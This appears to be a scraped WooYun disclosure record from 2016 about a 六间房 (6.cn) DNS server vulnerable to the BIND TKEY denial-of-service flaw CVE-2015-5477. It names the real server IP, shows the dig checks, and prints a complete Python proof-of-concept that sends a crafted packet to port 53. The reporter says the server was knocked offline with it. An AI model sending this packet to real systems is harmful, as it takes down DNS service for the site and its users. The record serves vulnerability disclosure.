{"id": 85859, "wybug_id": "wooyun-2016-0192603", "wybug_title": "六间房某服务器存在BIND查询拒绝服务漏洞", "wybug_corp": "六间房", "wybug_author": "路人甲", "wybug_date": "2016-04-05 15:32", "wybug_open_date": "2016-04-05 20:08", "wybug_type": "应用配置错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-04-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-05：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 六间房某服务器存在BIND查询拒绝服务漏洞 详细说明：  ISC BIND是美国Internet Systems Consortium（ISC）公司所维护的一套DNS域名解析服务软件。该软件被披露存在拒绝服务漏洞，由于TKEY查询的错误可导致BIND服务器发生REQUIRE断言失败并停止服务，攻击者利用漏洞可恶意构造数据包，导致TKEY记录查询错误，进而导致BIND服务器发生REQUIRE断言失败并停止服务。CNVD对该漏洞的综合评级为“高危”。   漏洞证明：  dns查询：\ndig 6.cn\n\n\n以ns1.6.cn为测试对象\ndig @ns1.6.cn 6.cn\n\n\n其中\nns1.6.cn.\t\t1800\tIN\tA\t122.70.135.62\n上利用poc\npython dos.py 122.70.135.62\n再次查询：\ndig @ns1.6.cn 6.cn\n已经拒绝服务了\n\n   修复方案：  poc如下\n<code>#!/usr/bin/env python import socketimport sys print('CVE-2015-5477 BIND9 TKEY PoC') if len(sys.argv) < 2:    print('Usage: ' + sys.argv[0] + ' [target]')    sys.exit(1) print('Sending packet to ' + sys.argv[1] + ' ...') payload = bytearray('4d 55 01 00 00 01 00 00 00 00 00 01 03 41 41 41 03 41 41 41 00 00 f9 00 ff 03 41 41 41 03 41 41 41 00 00 0a 00 ff 00 00 00 00 00 09 08 41 41 41 41 41 41 41 41'.replace(' ', '').decode('hex'))  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)sock.sendto(payload, (sys.argv[1], 53)) print('Done.')\n</code>升级   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2016-04-05 20:05 厂商回复： 谢谢！ 最新状态： 2016-04-05：已修复 2016-04-05：已修复  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}